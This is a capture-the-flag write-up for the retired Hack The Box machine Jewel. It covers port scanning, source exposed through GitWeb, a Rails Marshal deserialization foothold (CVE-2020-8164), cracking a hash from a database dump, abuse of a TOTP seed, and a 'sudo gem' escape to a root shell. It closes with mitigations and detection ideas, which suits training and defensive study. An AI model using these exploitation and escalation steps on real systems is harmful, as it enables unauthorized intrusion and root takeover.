---
machine: Jewel
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, gitweb, rails, deserialization, totp, gtfobins]
---

# Jewel — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

GitWeb exposes the source of a Rails 5.2.2.1 application. The username is stored in Redis and deserialised with `Marshal`, allowing CVE-2020-8164/8165 exploitation and command execution as `bill`. Escalation combines the database dump password, the TOTP seed in `.google_authenticator` and `sudo gem`, solved with GTFOBins.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,8000,8080 <IP>
```

- SSH, Apache on 8000 and a web service on 8080.
- GitWeb on port 8080.

## Enumeration

```bash
curl -s http://<IP>:8080/
git clone http://<IP>:8080/<repo>.git
```

The `Gemfile` pins Rails 5.2.2.1. `application_controller.rb` and `users_controller.rb` read `username` from Redis.

## Foothold

CVE-2020-8164 deserialises attacker-controlled objects from Redis. A `Marshal.dump` of `DeprecatedInstanceVariableProxy` wrapping an `ERB` command is sent as `username`:

```bash
rails console
payload = Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result))
```

The application deserialises the value and runs the command as `bill`.

## Lateral movement

```bash
cat ~/blog/config/database.yml
psql -h localhost -U rails_dev -d blog_development
```

`/var/backups/dump_*.sql` contains an old `bill` hash; `hashcat -m 3200` recovers the password. `.google_authenticator` stores the TOTP seed.

## Privilege escalation

```bash
oathtool -b --totp '<SEED>'
sudo -l
sudo gem open -e "/bin/sh -c /bin/sh" rdoc
```

`sudo` asks for the password and a TOTP code, then allows `/usr/bin/gem`. GTFOBins opens an editor and spawns a root shell.

## Evidence

- GitWeb repository and `Gemfile`.
- Request carrying the serialised `Marshal` payload.
- `sudo -l` and `gem` usage.
- `id` as root.

## Lessons learned

- Exposed source code accelerates any audit.
- Deserialising session data is potential code execution.
- A second factor does not help if its seed sits on the same host.

## Mitigations and detection

- Do not expose GitWeb or internal repositories.
- Update Rails and never deserialise user data.
- Protect TOTP seeds and restrict `sudo` to binaries without escapes.
- Alert on `Marshal` objects in Redis and on `gem open`.

## References

- <https://www.hackthebox.com/machines/Jewel>
- <https://0xdf.gitlab.io/2021/02/13/htb-jewel.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2020-8164>
- <https://gtfobins.github.io/gtfobins/gem/>
